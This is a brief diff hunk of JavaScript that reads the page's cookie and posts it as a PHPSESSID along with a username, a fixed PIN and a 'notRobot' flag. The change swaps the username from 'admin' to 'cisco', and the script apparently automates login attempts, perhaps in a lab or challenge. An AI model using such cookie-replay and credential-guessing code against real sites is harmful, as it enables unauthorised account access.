@@ -12,6 +12,6 @@ http.onload = function () {
      //}
 };
 const cook = document.cookie;
-http.send("PHPSESSID="+cook+"&username=admin&pin=123456&notRobot=on");
+http.send("PHPSESSID="+cook+"&username=cisco&pin=123456&notRobot=on");
    
 
